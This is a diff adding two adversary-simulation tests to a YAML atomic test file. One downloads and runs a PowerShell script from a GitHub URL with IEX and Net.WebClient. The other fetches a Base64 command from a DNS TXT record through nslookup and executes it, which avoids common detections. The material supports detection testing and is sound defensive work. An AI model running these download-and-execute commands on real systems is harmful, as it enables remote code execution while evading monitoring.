@@ -481,4 +481,43 @@ atomic_tests:
     command: |
       #{soaphound_path} --user $(#{user})@$(#{domain}) --password #{password} --dc #{dc} --buildcache --cachefilename #{cachefilename}
     name: powershell
-
+- name: 'Possehl: Powershell remote script execution'
+  description: Download base64 encoded script and execute it. based on Test 1 (Mimikatz) but without malicious payload
+  supported_platforms:
+    - windows
+  input_arguments:
+    pwshurl:
+      type: url
+      default: https://raw.githubusercontent.com/Moerov/FireSOC/refs/heads/main/utils/totally_safe_1059.ps1
+      description: Powershell script url
+  executor:
+    command: IEX (New-Object Net.WebClient).DownloadString('#{pwshurl}')
+    name: powershell
+    elevation_required: false
+- name: Retrieve and Execute Base64 PowerShell Payload via DNS TXT Record (Possehl)
+  auto_generated_guid: 5d0d9dc2-cc6e-4b43-aaba-1dbb24edacda
+  description: |
+    Simulates retrieving a Base64-encoded PowerShell command from a DNS TXT record and executing it.
+    This technique avoids IEX and Invoke-WebRequest by leveraging DNS queries via nslookup.
+    The DNS record (cmd.click-boom.site) returns a simple "simulation" script encoded in Base64.
+    Inspired by red team tradecraft.
+  supported_platforms:
+    - windows
+  input_arguments:
+    dns_domain:
+      description: Domain hosting the Base64-encoded command in a TXT record
+      type: string
+      default: cmd.click-boom.site
+    dns_server:
+      description: DNS server to query
+      type: string
+      default: 8.8.8.8
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      $domain = "#{dns_domain}"
+      $dns = "#{dns_server}"
+      $encoded = (nslookup -q=txt $domain $dns)[-1]
+      $cmd = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($encoded))
+      powershell -Command $cmd
